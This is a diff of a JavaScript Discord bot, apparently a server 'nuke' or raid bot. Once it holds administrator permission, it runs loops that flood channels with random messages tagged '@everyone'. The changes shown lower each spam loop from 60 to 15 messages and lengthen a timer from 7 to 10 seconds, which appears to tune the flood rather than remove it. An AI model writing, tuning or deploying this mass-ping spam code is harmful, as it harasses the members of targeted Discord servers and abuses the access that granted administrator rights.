@@ -293,7 +293,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
             
             })
             var spam = 0
-            while(spam < 60) 
+            while(spam < 15) 
         {    
             p.send(randomT() + " @everyone")
             spam++
@@ -312,7 +312,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
             
             })
             var spam = 0
-            while(spam < 60) 
+            while(spam < 15) 
         {    
             p.send(randomT() + " @everyone")
             spam++
@@ -331,7 +331,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                
                })
                var spam = 0
-               while(spam < 60) 
+               while(spam < 15) 
            {    
                p.send(randomT() + " @everyone")
                spam++
@@ -350,7 +350,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                 
                 })
                 var spam = 0
-                while(spam < 60) 
+                while(spam < 15) 
             {    
                 p.send(randomT() + " @everyone")
                 spam++
@@ -370,7 +370,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                  })
              
              var spam = 0
-             while(spam < 60) 
+             while(spam < 15) 
          {    
              c.send(randomT() + " @everyone")
              spam++
@@ -381,7 +381,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
  
          }
          
-        }, 7000);
+        }, 10000);
      }
  })
  
